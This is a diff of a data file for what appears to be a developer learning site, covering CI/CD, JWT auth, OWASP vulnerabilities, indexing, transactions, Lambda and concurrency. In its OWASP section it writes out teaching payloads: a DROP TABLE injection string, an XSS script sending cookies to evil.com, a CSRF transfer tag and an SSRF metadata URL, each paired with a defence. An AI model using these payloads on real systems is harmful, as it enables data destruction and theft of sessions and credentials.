+    explanation: `<p><strong>Continuous Integration (CI)</strong>: Every time a developer pushes code to a shared branch, an automated pipeline runs: install dependencies → lint → test → build. This catches bugs immediately, on every commit, before they reach other developers or production. The goal: fast feedback (under 10 minutes) so developers aren't blocked.</p>
+    <p><strong>Continuous Delivery (CD)</strong>: Every passing build is automatically deployable. The pipeline continues: build Docker image → push to registry → deploy to staging → run integration/E2E tests → await approval (or auto-promote) → deploy to production. The last step may be manual in some orgs (Continuous Delivery) or fully automated (Continuous Deployment).</p>
+    <p><strong>Pipeline as code:</strong> GitHub Actions, GitLab CI, CircleCI, Jenkins — all define pipelines in YAML/Groovy committed to the repo. This means the pipeline itself is versioned, code-reviewed, and reproducible. No more "the CI server has special config that nobody knows about."</p>
+    <div class="highlight"><strong>Deployment strategies:</strong> <strong>Blue/Green</strong> — two identical environments (blue=current, green=new). Deploy to green, test it, switch load balancer to green. Rollback = switch back. Zero downtime, but doubles infrastructure cost briefly. <strong>Canary</strong> — route 5% of traffic to new version, monitor error rates, gradually increase to 100%. Catches bugs with minimal blast radius. <strong>Feature flags</strong> — deploy code dark, toggle features per user/region without redeploying.</div>
+    <p><strong>Trunk-based development</strong> vs feature branches: trunk-based (all developers commit to main frequently, short-lived branches) enables true CI. Long-lived feature branches cause "merge hell." Feature flags enable deploying incomplete features safely to main.</p>`,
+    usecases: [
+      { where: 'SaaS product team (GitHub Actions)', desc: 'On every PR: lint (ESLint), type-check (tsc), unit tests (Jest), build Docker image, run integration tests against a test DB. If all pass, the PR can be merged. On merge to main: build production image, push to ECR, deploy to staging via ArgoCD, run Playwright E2E tests, Slack notification. On tag: promote to production.' },
+      { where: 'Mobile app (React Native CI)', desc: 'On PR: run Jest tests, TypeScript compilation. On merge to main: Expo builds iOS and Android bundles, uploads to TestFlight and Play Console internal track, notifies QA team to test. On release: submit to App Store/Play Store automatically.' },
+      { where: 'Open source library publishing', desc: 'On merge to main: run tests across Node 18, 20, 22 using GitHub Actions matrix. If tests pass and semantic-release detects conventional commits (feat/fix/breaking), it auto-bumps version, generates CHANGELOG, creates GitHub Release, publishes to npm.' },
+      { where: 'Infrastructure changes (Terraform CI)', desc: 'On PR with Terraform changes: <code>terraform plan</code> output is posted as a PR comment showing exactly what will change. Two engineers must approve. On merge: <code>terraform apply</code> runs in a locked CD pipeline — only one apply runs at a time to prevent state corruption.' },
+    ],
+    code: `<span class="cm"># .github/workflows/ci-cd.yml</span>
+<span class="kw">on</span>:
+  push: { branches: [main] }
+  pull_request: {}
+
+<span class="kw">jobs</span>:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 20, cache: npm }
+      - run: npm ci
+      - run: npm run lint
+      - run: npm run test:ci -- --coverage
+      - uses: codecov/codecov-action@v3
+
+  deploy:
+    needs: test
+    if: github.ref == 'refs/heads/main'
+    steps:
+      - name: Build & push Docker image
+        run: |
+          docker build -t $ECR_REPO:$GITHUB_SHA .
+          docker push $ECR_REPO:$GITHUB_SHA
+      - name: Deploy to Kubernetes
+        run: |
+          kubectl set image deployment/api \
+            api=$ECR_REPO:$GITHUB_SHA
+          kubectl rollout status deployment/api`,
+    tags: ['GitHub Actions', 'GitLab CI', 'CircleCI', 'Blue/Green', 'Canary', 'Feature Flags', 'ArgoCD']
+  },
+],
+
+security: [
+  {
+    title: 'Authentication & JWT',
+    badge: 'Auth', color: 'gold',
+    tagline: 'Verifying who a user is — and the tokens that prove it across requests.',
+    explanation: `<p>Authentication answers "who are you?" Authorization answers "what are you allowed to do?" They're distinct — and conflating them is a common mistake. A user who is authenticated (logged in) may not be authorized (permitted) to access a specific resource.</p>
+    <p><strong>JWT (JSON Web Token)</strong> is the dominant stateless auth mechanism for APIs. A JWT has three base64url-encoded parts separated by dots: <code>header.payload.signature</code>. The <strong>header</strong> specifies the algorithm (<code>HS256</code> or <code>RS256</code>). The <strong>payload</strong> contains claims — standard (<code>sub</code> for subject/user ID, <code>exp</code> for expiration, <code>iat</code> for issued-at) and custom (<code>role</code>, <code>permissions</code>). The <strong>signature</strong> is a cryptographic hash of header+payload using a secret key.</p>
+    <p>The server signs the JWT when the user logs in. On subsequent requests, the client sends the JWT in the <code>Authorization: Bearer &lt;token&gt;</code> header. The server validates the signature — if valid and not expired, it trusts the claims without any database lookup. This is what makes JWT <strong>stateless</strong>.</p>
+    <div class="highlight"><strong>HS256 vs RS256:</strong> HS256 uses a single shared secret — simple, but every service that validates tokens needs the secret. RS256 uses a private/public key pair — the auth server signs with the private key, all other services verify with the public key (safe to distribute). RS256 is essential for microservices where multiple services validate tokens.</div>
+    <p><strong>Access + Refresh token pattern:</strong> Access tokens expire quickly (15 minutes) — short exposure window if stolen. Refresh tokens live longer (7-30 days) and are stored in an HttpOnly cookie (inaccessible to JS — XSS-proof). When the access token expires, the client silently calls <code>POST /auth/refresh</code> with the refresh token cookie to get a new access token. The server can revoke refresh tokens (stored in DB/Redis) to force logout.</p>
+    <div class="warning"><strong>Never store JWTs in localStorage.</strong> XSS attacks can read localStorage and steal the token. Store access tokens in memory (JS variable) and refresh tokens in HttpOnly cookies. Memory tokens are lost on page reload — use the refresh endpoint on startup to restore the session.</div>`,
+    usecases: [
+      { where: 'Single-page application login flow', desc: 'User submits email/password. Server validates, returns access token (in JSON body) and refresh token (in Set-Cookie: HttpOnly). SPA stores access token in memory, attaches to all API requests via Authorization header. Axios interceptor catches 401 responses, calls refresh endpoint, retries original request transparently.' },
+      { where: 'Microservices authorization', desc: 'API Gateway (Kong/nginx) validates JWT signature using the auth service\'s public key. If valid, it forwards the request with the decoded user claims as headers. Downstream services trust these headers — no DB lookup needed. They read <code>X-User-Id</code> and <code>X-User-Role</code> headers set by the gateway.' },
+      { where: 'Machine-to-machine auth (Client Credentials)', desc: 'A data pipeline service needs to call the reporting API. It uses OAuth 2.0 Client Credentials flow: posts client_id + client_secret to get an access token, uses it for API calls. No user involved. Token has service-level permissions, not user permissions.' },
+      { where: 'Social login (OAuth 2.0)', desc: '"Sign in with Google" uses OAuth 2.0 Authorization Code flow + PKCE. User is redirected to Google, approves permissions, Google redirects back with an auth code. Your server exchanges the code for an ID token (OIDC) containing the user\'s email and profile. You create/find the user in your DB and issue your own JWT.' },
+    ],
+    code: `<span class="cm">// JWT creation and validation (Node.js / jsonwebtoken)</span>
+<span class="kw">import</span> jwt <span class="kw">from</span> <span class="str">'jsonwebtoken'</span>;
+
+<span class="cm">// On login: create tokens</span>
+<span class="kw">const</span> accessToken = jwt.<span class="fn">sign</span>(
+  { sub: user.id, role: user.role },
+  process.env.JWT_SECRET,
+  { expiresIn: <span class="str">'15m'</span>, algorithm: <span class="str">'RS256'</span> }
+);
+
+<span class="cm">// Middleware: validate on every protected route</span>
+<span class="kw">function</span> <span class="fn">authenticate</span>(req, res, next) {
+  <span class="kw">const</span> token = req.headers.authorization?.<span class="fn">split</span>(<span class="str">' '</span>)[<span class="num">1</span>];
+  <span class="kw">if</span> (!token) <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Unauthorized'</span> });
+  
+  <span class="kw">try</span> {
+    req.user = jwt.<span class="fn">verify</span>(token, PUBLIC_KEY, { algorithms: [<span class="str">'RS256'</span>] });
+    <span class="fn">next</span>();
+  } <span class="kw">catch</span> {
+    res.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid token'</span> });
+  }
+}
+
+<span class="cm">// Authorization: check permissions after auth</span>
+<span class="kw">function</span> <span class="fn">requireRole</span>(role) {
+  <span class="kw">return</span> (req, res, next) => {
+    <span class="kw">if</span> (req.user.role !== role) <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({ error: <span class="str">'Forbidden'</span> });
+    <span class="fn">next</span>();
+  };
+}`,
+    tags: ['JWT', 'OAuth 2.0', 'OIDC', 'RS256', 'HttpOnly Cookie', 'Refresh Token', 'PKCE']
+  },
+  {
+    title: 'OWASP Top 10 & Common Vulnerabilities',
+    badge: 'Vulnerabilities', color: 'gold',
+    tagline: 'The most critical web security risks — every developer must know and prevent these.',
+    explanation: `<p>The <strong>OWASP Top 10</strong> is the industry-standard list of the most critical web application security risks. These aren't theoretical — they are the actual vulnerabilities behind the majority of data breaches. Understanding and preventing them is a baseline expectation for any professional developer.</p>
+    <p><strong>1. SQL Injection:</strong> Attacker inserts SQL syntax into user input, altering the query. <code>'; DROP TABLE users; --</code> as a username can destroy your database. Prevention: parameterized queries / prepared statements — always. Never concatenate user input into SQL strings. ORMs use parameterization by default, but raw query strings in ORMs bypass this.</p>
+    <p><strong>2. XSS (Cross-Site Scripting):</strong> Attacker injects malicious JavaScript into a page that other users view. Stored XSS: saved in DB and rendered to all users (e.g., a comment with <code>&lt;script&gt;document.cookie&lt;/script&gt;</code>). Reflected XSS: in URL params rendered in the response. Prevention: escape all user-generated output (React does this by default — dangerouslySetInnerHTML bypasses it), Content Security Policy header restricts script sources.</p>
+    <p><strong>3. Broken Access Control:</strong> Users can access resources they shouldn't. Example: changing <code>/users/42/profile</code> to <code>/users/43/profile</code> and seeing another user's data. Prevention: always check authorization server-side — never trust the client to restrict what it shows. Deny by default; explicitly grant access. This is the #1 OWASP risk.</p>
+    <div class="highlight"><strong>4. CSRF (Cross-Site Request Forgery):</strong> Attacker's site makes authenticated requests on behalf of the victim. <code>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</code> — if the victim is logged into bank.com, the browser sends their session cookie. Prevention: SameSite cookie attribute (Lax/Strict) — modern browsers block cross-site cookies. CSRF tokens for older architectures.</div>
+    <p><strong>5. SSRF (Server-Side Request Forgery):</strong> Attacker makes the server fetch a URL they control, allowing access to internal services. If your API accepts a URL parameter and fetches it, an attacker can pass <code>http://169.254.169.254/latest/meta-data/</code> to access AWS metadata and steal IAM credentials. Prevention: whitelist allowed hosts, block private IP ranges, use egress filtering.</p>`,
+    usecases: [
+      { where: 'User input in SQL queries', desc: 'A login form with <code>SELECT * FROM users WHERE email = \'{input}\' AND password = \'{input}\'</code> is injectable. Parameterized: <code>SELECT * FROM users WHERE email = $1 AND password = $2</code> with separate params. Use <code>pg</code> (Node) or your ORM\'s query builder — never string concatenation.' },
+      { where: 'User-generated content rendering', desc: 'A forum allows HTML in posts. An attacker posts <code>&lt;script&gt;fetch(\'https://evil.com?c=\'+document.cookie)&lt;/script&gt;</code>. Every user viewing the post leaks their session cookie. Prevention: sanitize HTML server-side with DOMPurify or a whitelist-based sanitizer. Set CSP: <code>script-src \'self\'</code>.' },
+      { where: 'IDOR (Insecure Direct Object Reference)', desc: 'An API endpoint <code>GET /api/invoices/1234</code> returns invoice data without checking if the authenticated user owns invoice 1234. An attacker iterates invoice IDs and downloads all invoices. Fix: always query with <code>WHERE id = ? AND user_id = ?</code>.' },
+      { where: 'Dependency vulnerabilities', desc: 'Log4Shell (CVE-2021-44228) was a critical RCE vulnerability in the log4j Java library used by thousands of applications. <code>npm audit</code>, <code>Snyk</code>, and <code>Dependabot</code> automatically scan your dependencies and alert when known CVEs are found. Running outdated packages is one of the easiest attacks to exploit.' },
+    ],
+    code: `<span class="cm">// ❌ SQL Injection vulnerability</span>
+<span class="kw">const</span> result = <span class="kw">await</span> db.<span class="fn">query</span>(
+  <span class="str">\`SELECT * FROM users WHERE email = '\${email}'\`</span>
+);
+
+<span class="cm">// ✅ Parameterized query (safe)</span>
+<span class="kw">const</span> result = <span class="kw">await</span> db.<span class="fn">query</span>(
+  <span class="str">'SELECT * FROM users WHERE email = $1'</span>, [email]
+);
+
+<span class="cm">// ❌ XSS: rendering user content as HTML</span>
+div.innerHTML = userComment;  <span class="cm">// executes embedded &lt;script&gt;</span>
+
+<span class="cm">// ✅ Safe: React escapes by default</span>
+<span class="kw">return</span> &lt;div&gt;{userComment}&lt;/div&gt;;
+
+<span class="cm">// ✅ Broken Access Control fix: always check ownership</span>
+<span class="kw">const</span> invoice = <span class="kw">await</span> db.<span class="fn">query</span>(
+  <span class="str">'SELECT * FROM invoices WHERE id=$1 AND user_id=$2'</span>,
+  [req.params.id, req.user.id]  <span class="cm">// can't access other users'</span>
+);`,
+    tags: ['OWASP', 'SQL Injection', 'XSS', 'CSRF', 'SSRF', 'IDOR', 'CSP', 'SameSite']
+  },
+],
+
+databases: [
+  {
+    title: 'Database Indexing',
+    badge: 'Performance', color: 'blue',
+    tagline: 'The single most impactful database optimization — turning O(n) table scans into O(log n) lookups.',
+    explanation: `<p>Without an index, a query like <code>SELECT * FROM orders WHERE user_id = 42</code> performs a <strong>full table scan</strong> — it reads every row in the table to find matches. With 10 million orders, that's 10 million rows read for what might be 5 results. With an index on <code>user_id</code>, the database jumps directly to the relevant rows in O(log n) time.</p>
+    <p><strong>B-Tree index</strong> (default in Postgres, MySQL): A balanced tree structure where each node is a page of sorted key values with pointers. Supports: equality queries (<code>WHERE id = 42</code>), range queries (<code>WHERE created_at &gt; '2024-01-01'</code>), ORDER BY (if indexed), and LIKE with a leading constant (<code>LIKE 'john%'</code> — but not <code>LIKE '%john'</code>).</p>
+    <p><strong>Composite indexes</strong> and the <strong>leftmost prefix rule</strong>: An index on <code>(user_id, created_at, status)</code> can be used for queries filtering on: <code>user_id</code> alone, <code>user_id + created_at</code>, or <code>user_id + created_at + status</code> — but NOT for queries on <code>created_at</code> or <code>status</code> alone. The order of columns in the index definition matters enormously.</p>
+    <div class="highlight"><strong>Indexes have costs:</strong> Every INSERT, UPDATE, DELETE must also update all relevant indexes. A table with 10 indexes is much slower to write to than one with 1. Index maintenance adds write amplification. Don't index every column "just in case" — index based on actual query patterns. Use <code>EXPLAIN ANALYZE</code> to verify an index is actually being used.</div>
+    <p><strong>Covering index:</strong> If all columns needed by a query are in the index (SELECT columns, WHERE columns, ORDER BY columns), the DB can answer the query from the index alone without reading the main table ("heap"). This is called an index-only scan and is extremely fast.</p>
+    <p><strong>Partial index:</strong> Index only a subset of rows. <code>CREATE INDEX ON orders(user_id) WHERE status = 'pending'</code> — smaller index, much faster for queries on pending orders specifically. Useful when you frequently query a small subset of a large table.</p>`,
+    usecases: [
+      { where: 'User lookup by email (auth)', desc: 'Every login checks <code>SELECT * FROM users WHERE email = ?</code>. With millions of users and no index, this is a full table scan on every login. A unique index on <code>email</code> makes this O(log n) — milliseconds instead of seconds. This index also enforces uniqueness at the DB level, preventing duplicate accounts.' },
+      { where: 'Activity feed queries', desc: 'A social platform fetches a user\'s posts ordered by recency: <code>SELECT * FROM posts WHERE user_id = ? ORDER BY created_at DESC LIMIT 20</code>. A composite index on <code>(user_id, created_at DESC)</code> covers both the filter and the sort — the DB reads exactly 20 rows without a sort step. Without it: full scan + sort of all user\'s posts.' },
+      { where: 'Analytics queries on large tables', desc: 'A query counting orders by status for the last 30 days runs on a 500M-row orders table. A partial index on <code>(created_at, status)</code> where <code>created_at > now() - interval \'90 days\'</code> is a small, fast index for recent data. The DB can answer last-30-days queries from a tiny fraction of the data.' },
+      { where: 'Full-text search (GIN index)', desc: 'A product search <code>WHERE description @@ to_tsquery(\'organic coffee\')</code> uses a GIN (Generalized Inverted Index) on the <code>tsvector</code> column. GIN indexes inverted term mappings — each word maps to the rows containing it. Far more efficient than LIKE for text search.' },
+    ],
+    code: `<span class="cm">-- Single column index (most common)</span>
+<span class="kw">CREATE INDEX</span> idx_users_email <span class="kw">ON</span> users(email);
+
+<span class="cm">-- Composite index: leftmost prefix rule applies</span>
+<span class="cm">-- Covers: (user_id), (user_id, created_at), (user_id, created_at, status)</span>
+<span class="kw">CREATE INDEX</span> idx_orders_user_date <span class="kw">ON</span> orders(user_id, created_at <span class="kw">DESC</span>);
+
+<span class="cm">-- Partial index: only index pending orders (much smaller)</span>
+<span class="kw">CREATE INDEX</span> idx_pending <span class="kw">ON</span> orders(user_id)
+<span class="kw">WHERE</span> status = <span class="str">'pending'</span>;
+
+<span class="cm">-- GIN index for full-text search</span>
+<span class="kw">CREATE INDEX</span> idx_products_fts <span class="kw">ON</span> products
+<span class="kw">USING</span> GIN(to_tsvector(<span class="str">'english'</span>, name || <span class="str">' '</span> || description));
+
+<span class="cm">-- EXPLAIN ANALYZE: see the actual query plan and cost</span>
+<span class="kw">EXPLAIN</span> (ANALYZE, BUFFERS)
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> orders
+<span class="kw">WHERE</span> user_id = <span class="num">42</span>
+<span class="kw">ORDER BY</span> created_at <span class="kw">DESC</span>
+<span class="kw">LIMIT</span> <span class="num">20</span>;
+<span class="cm">-- Look for: "Index Scan" (good) vs "Seq Scan" (potential problem)</span>`,
+    tags: ['PostgreSQL', 'MySQL', 'B-Tree', 'GIN', 'Composite Index', 'EXPLAIN ANALYZE', 'Performance']
+  },
+  {
+    title: 'ACID Transactions',
+    badge: 'Core Concept', color: 'blue',
+    tagline: 'The four guarantees that make relational databases trustworthy for critical data.',
+    explanation: `<p>Without transactions, a bank transfer of $100 from Account A to Account B requires two operations: debit A, credit B. If the system crashes between them, $100 vanishes. <strong>Transactions</strong> wrap multiple operations into a single atomic unit — all succeed or all are rolled back.</p>
+    <p><strong>Atomicity:</strong> The transaction is an "all or nothing" unit. If any operation fails, the entire transaction is rolled back to the state before it started. No partial updates. This is enforced by the transaction log (WAL — Write-Ahead Log): the DB writes the intended changes to a log before applying them. On crash, it replays the log to recover.</p>
+    <p><strong>Consistency:</strong> A transaction brings the database from one valid state to another. All constraints (foreign keys, unique constraints, check constraints, NOT NULL) must be satisfied after the transaction commits. If a constraint is violated, the transaction is rolled back.</p>
+    <p><strong>Isolation:</strong> Concurrent transactions don't interfere with each other's intermediate states. This is the most complex property. Isolation levels define the trade-off between concurrency and correctness: <strong>Read Uncommitted</strong> (see uncommitted changes — "dirty reads"), <strong>Read Committed</strong> (only see committed data — default in Postgres), <strong>Repeatable Read</strong> (same query returns same results within a transaction), <strong>Serializable</strong> (transactions behave as if they ran one at a time — safest, slowest).</p>
+    <div class="highlight"><strong>Isolation anomalies:</strong> <strong>Dirty read</strong>: reading uncommitted data. <strong>Non-repeatable read</strong>: same query returns different rows within a transaction (another transaction committed a change). <strong>Phantom read</strong>: a range query returns different rows (new rows were inserted). Each isolation level prevents different anomalies.</div>
+    <p><strong>Durability:</strong> Once committed, data survives crashes. Achieved via WAL (Write-Ahead Log) — changes are written to durable log before applying to data pages. On crash, WAL is replayed. <code>fsync</code> ensures the WAL is physically on disk, not just in OS buffers. Disabling fsync dramatically increases write speed but risks data loss on crash.</p>`,
+    usecases: [
+      { where: 'Financial transactions (banking, payments)', desc: 'Transferring money: <code>BEGIN; UPDATE accounts SET balance = balance - 100 WHERE id = 1; UPDATE accounts SET balance = balance + 100 WHERE id = 2; COMMIT;</code> If the second UPDATE fails, the first is automatically rolled back. The invariant "total money is conserved" is always maintained.' },
+      { where: 'Inventory management (preventing overselling)', desc: 'An e-commerce checkout uses <code>SELECT quantity FOR UPDATE</code> (acquires a row-level lock) to read current stock, checks if sufficient, decrements, and commits. The FOR UPDATE lock prevents two concurrent checkouts from both seeing "1 in stock" and both selling it — one transaction waits for the other to commit.' },
+      { where: 'Multi-step user registration', desc: 'Creating a user and their profile in two tables: wrap both INSERTs in a transaction. If the profile INSERT fails (e.g., FK violation), the user INSERT is rolled back. No orphaned user records with no profile.' },
+      { where: 'Distributed sagas (when you can\'t use transactions)', desc: 'In microservices, you can\'t use a DB transaction across service boundaries. A saga is a sequence of local transactions with compensating transactions for rollback. Order saga: reserve inventory → charge payment → ship. If shipping fails: refund payment → release inventory. Each step has a compensation.' },
+    ],
+    code: `<span class="cm">-- Bank transfer with transaction</span>
+<span class="kw">BEGIN</span>;
+
+<span class="kw">UPDATE</span> accounts
+<span class="kw">SET</span> balance = balance - <span class="num">100</span>
+<span class="kw">WHERE</span> id = <span class="num">1</span> <span class="kw">AND</span> balance >= <span class="num">100</span>;  <span class="cm">-- check sufficient funds</span>
+
+<span class="kw">IF</span> NOT FOUND <span class="kw">THEN</span>
+  <span class="kw">ROLLBACK</span>;  <span class="cm">-- insufficient funds</span>
+<span class="kw">END IF</span>;
+
+<span class="kw">UPDATE</span> accounts
+<span class="kw">SET</span> balance = balance + <span class="num">100</span>
+<span class="kw">WHERE</span> id = <span class="num">2</span>;
+
+<span class="kw">COMMIT</span>;  <span class="cm">-- both or neither</span>
+
+<span class="cm">-- Prevent race condition with pessimistic locking</span>
+<span class="kw">BEGIN</span>;
+<span class="kw">SELECT</span> quantity <span class="kw">FROM</span> products
+<span class="kw">WHERE</span> id = <span class="num">42</span> <span class="kw">FOR UPDATE</span>;  <span class="cm">-- lock the row</span>
+<span class="cm">-- only one transaction can hold this lock at a time</span>
+<span class="kw">UPDATE</span> products <span class="kw">SET</span> quantity = quantity - <span class="num">1</span> <span class="kw">WHERE</span> id = <span class="num">42</span>;
+<span class="kw">COMMIT</span>;`,
+    tags: ['ACID', 'PostgreSQL', 'Transactions', 'Isolation Levels', 'Locking', 'WAL', 'Saga Pattern']
+  },
+],
+
+cloud: [
+  {
+    title: 'Serverless & AWS Lambda',
+    badge: 'Compute', color: 'blue',
+    tagline: 'Running code without managing servers — auto-scaling to zero, paying only for execution.',
+    explanation: `<p><strong>Serverless</strong> doesn't mean "no servers" — it means <em>you don't manage the servers</em>. AWS Lambda, GCP Cloud Functions, and Cloudflare Workers handle provisioning, OS patching, scaling, and availability. You upload code and pay per execution (per 100ms of runtime).</p>
+    <p><strong>How Lambda works:</strong> When a function is triggered (API Gateway, S3 event, SQS message, schedule), Lambda finds or creates a container running your runtime (Node, Python, Go, etc.) and executes your handler. The container may be reused for subsequent invocations (<strong>warm start</strong>) or a new one must be initialized (<strong>cold start</strong> — adds 100-500ms latency). Cold starts happen on first invocation, after inactivity, or when scaling out rapidly.</p>
+    <p><strong>Execution model:</strong> Each Lambda invocation is isolated — no shared state between invocations. Use external storage (DynamoDB, S3, Redis) for state. Limits: 15-minute max duration, 10GB memory, 512MB-10GB ephemeral storage (<code>/tmp</code>), 1000 concurrent executions per region by default.</p>
+    <div class="highlight"><strong>Cold start mitigation:</strong> (1) Provisioned Concurrency — Lambda pre-warms N containers, always ready. Costs money even when idle. (2) Keep functions warm via scheduled pings (CloudWatch Events). (3) Minimize package size — smaller zip = faster initialization. (4) Use Node/Python over Java — JVM has the worst cold starts. (5) Move initialization code (DB connections, config loading) outside the handler function — it runs once and is reused across warm invocations.</div>
+    <p><strong>Serverless trade-offs:</strong> Great for: event-driven processing, scheduled tasks, API backends with variable traffic, webhooks, image resizing, data pipelines. Poor for: long-running processes, WebSocket servers, high-throughput low-latency services (cold starts matter), or workloads needing persistent connections. Cost is usage-based — can be cheaper or more expensive than EC2 depending on traffic pattern.</p>`,
+    usecases: [
+      { where: 'Image processing pipeline (S3 trigger)', desc: 'User uploads profile photo to S3. An S3 event triggers a Lambda function. Lambda downloads the image, uses Sharp to generate 3 thumbnail sizes, uploads results back to S3, and updates the user\'s DB record. This happens in parallel for every upload — no server to manage, scales to thousands of uploads automatically.' },
+      { where: 'REST API backend (API Gateway + Lambda)', desc: 'A startup builds their entire API as Lambda functions behind API Gateway. Each route is a separate function. Traffic is near-zero at launch — pays pennies. Launches on TechCrunch — handles 100x traffic spike automatically, no ops work. Scales back down to near-zero cost after.' },
+      { where: 'Scheduled jobs (CloudWatch Events)', desc: 'A SaaS app sends weekly digest emails. A CloudWatch rule triggers a Lambda every Monday at 8 AM UTC. Lambda queries the DB for users with weekly digest enabled, renders emails, calls SES. No cron server, no EC2 idle cost all week.' },
+      { where: 'Webhook receivers', desc: 'Stripe, GitHub, and Slack all send webhooks. A Lambda function receives them via API Gateway, validates the signature, enqueues a processing job in SQS, and returns 200 instantly. The actual processing happens async in another Lambda consuming the SQS queue. Handles webhook storms without dropping requests.' },
+    ],
+    code: `<span class="cm">// Lambda handler (Node.js) — called per invocation</span>
+<span class="kw">const</span> { S3Client, GetObjectCommand } = <span class="fn">require</span>(<span class="str">'@aws-sdk/client-s3'</span>);
+<span class="kw">const</span> sharp = <span class="fn">require</span>(<span class="str">'sharp'</span>);
+
+<span class="cm">// DB connection OUTSIDE handler: reused across warm invocations</span>
+<span class="kw">const</span> db = <span class="kw">new</span> <span class="fn">Pool</span>({ connectionString: process.env.DB_URL });
+
+exports.<span class="fn">handler</span> = <span class="kw">async</span> (event) => {
+  <span class="kw">const</span> key = event.Records[<span class="num">0</span>].s3.object.key;
+  
+  <span class="cm">// Download original</span>
+  <span class="kw">const</span> original = <span class="kw">await</span> s3.<span class="fn">send</span>(<span class="kw">new</span> <span class="fn">GetObjectCommand</span>({ Bucket, Key: key }));
+  
+  <span class="cm">// Generate thumbnails in parallel</span>
+  <span class="kw">await</span> Promise.<span class="fn">all</span>([<span class="num">100</span>, <span class="num">300</span>, <span class="num">800</span>].<span class="fn">map</span>(size =>
+    <span class="fn">sharp</span>(original.Body)
+      .<span class="fn">resize</span>(size, size)
+      .<span class="fn">webp</span>()
+      .<span class="fn">toBuffer</span>()
+      .<span class="fn">then</span>(buf => s3.<span class="fn">send</span>(<span class="kw">new</span> <span class="fn">PutObjectCommand</span>({
+        Bucket, Key: <span class="str">\`thumbs/\${size}/\${key}\`</span>, Body: buf
+      })))
+  ));
+
+  <span class="kw">return</span> { statusCode: <span class="num">200</span> };
+};`,
+    tags: ['Lambda', 'Serverless', 'API Gateway', 'S3 Triggers', 'Cold Start', 'SQS', 'CloudWatch']
+  },
+],
+
+systems: [
+  {
+    title: 'Concurrency, Threads & the Process Model',
+    badge: 'OS Concepts', color: 'green',
+    tagline: 'How programs do multiple things simultaneously — and why it\'s fundamentally hard.',
+    explanation: `<p>A <strong>process</strong> is an independent program execution with its own virtual address space, file descriptors, and OS resources. Processes are isolated — a crash in one doesn't affect others. Communication between processes requires explicit IPC mechanisms (pipes, Unix sockets, shared memory).</p>
+    <p>A <strong>thread</strong> is a unit of execution within a process. Threads in the same process share heap memory, file descriptors, and global variables — but each has its own stack and program counter. Sharing memory enables fast communication but requires careful synchronization to avoid <strong>race conditions</strong> (when the outcome depends on which thread executes first).</p>
+    <p><strong>Race condition example:</strong> Thread A reads counter (=5), Thread B reads counter (=5), Thread A increments and writes (=6), Thread B increments and writes (=6). Counter should be 7 but is 6. Solution: a <strong>mutex</strong> (mutual exclusion lock) allows only one thread to execute the critical section at a time. <strong>Atomic operations</strong> are hardware-level primitives that perform read-modify-write as a single uninterruptible instruction — no lock needed for simple operations.</p>
+    <div class="highlight"><strong>Language runtime differences:</strong> Node.js has a single-threaded event loop — no shared memory, no race conditions in your JS code, but can't use multiple CPU cores natively (use Worker Threads or clustering). Python has the GIL (Global Interpreter Lock) — only one thread executes Python bytecode at a time, limiting CPU parallelism (use multiprocessing for CPU work). Go's goroutines are lightweight user-space threads — Go runtime multiplexes thousands of goroutines onto OS threads. Rust's ownership system prevents data races at compile time.</div>
+    <p><strong>Deadlock</strong>: Thread A holds Lock 1 and waits for Lock 2. Thread B holds Lock 2 and waits for Lock 1. Neither can proceed. Prevention: acquire locks in a consistent global order, use lock timeouts (try-lock with timeout), or use lock-free data structures.</p>`,
+    usecases: [
+      { where: 'Node.js clustering for multi-core CPUs', desc: 'A Node.js API running on a 16-core server uses only 1 core by default. The cluster module forks 16 worker processes sharing the same port. The OS distributes incoming connections across workers. No shared memory, no race conditions. PM2 or Kubernetes replicas achieve the same.' },
+      { where: 'CPU-intensive tasks with Worker Threads', desc: 'A Node.js server must parse and validate a 50MB JSON upload. Doing this in the main thread blocks the event loop — all other requests stall. Offloading to a Worker Thread runs it on a separate OS thread, keeping the main event loop free.' },
+      { where: 'Concurrent request handling in Go', desc: 'A Go HTTP server spawns a goroutine per request (very cheap — 2KB stack vs 1MB for OS threads). A server handling 100,000 concurrent requests spawns 100,000 goroutines — memory is ~200MB. The same in Java with OS threads would require ~100GB of stack memory.' },
+      { where: 'Database connection pools', desc: 'A DB driver like node-postgres maintains a pool of N pre-established connections. Queries from concurrent requests acquire a connection from the pool, use it, and release it. Without pooling, each request opens/closes a DB connection — expensive TCP handshakes and auth on every query.' },
+    ],
+    code: `<span class="cm">// Node.js: CPU work on Worker Thread (non-blocking)</span>
+<span class="kw">import</span> { Worker, isMainThread, parentPort, workerData } <span class="kw">from</span> <span class="str">'worker_threads'</span>;
+
+<span class="kw">if</span> (isMainThread) {
+  app.<span class="fn">post</span>(<span class="str">'/process'</span>, <span class="kw">async</span> (req, res) => {
+    <span class="kw">const</span> result = <span class="kw">await new</span> <span class="fn">Promise</span>((resolve, reject) => {
+      <span class="kw">const</span> worker = <span class="kw">new</span> <span class="fn">Worker</span>(__filename, { workerData: req.body });
+      worker.on(<span class="str">'message'</span>, resolve);
+      worker.on(<span class="str">'error'</span>, reject);
+    });
+    res.<span class="fn">json</span>(result);
+  });
+} <span class="kw">else</span> {
+  <span class="cm">// Runs in separate thread — main event loop unblocked</span>
+  <span class="kw">const</span> result = <span class="fn">heavyCPUWork</span>(workerData);
+  parentPort.<span class="fn">postMessage</span>(result);
+}
+
+<span class="cm">// Go: goroutines are cheap — one per request is idiomatic</span>
+<span class="cm">// http.ListenAndServe auto-spawns goroutine per connection</span>
+<span class="cm">// Mutex for shared state:</span>
+<span class="cm">// var mu sync.Mutex</span>
+<span class="cm">// mu.Lock(); counter++; mu.Unlock()</span>`,
+    tags: ['Threads', 'Processes', 'Event Loop', 'Worker Threads', 'Goroutines', 'Mutex', 'Race Condition', 'Go', 'Node.js']
+  },
+],
+
+networking: [
+  {
+    title: 'HTTP in Depth',
+    badge: 'Protocol', color: 'red',
+    tagline: 'The protocol that powers the web — headers, methods, status codes, and the evolution to HTTP/3.',
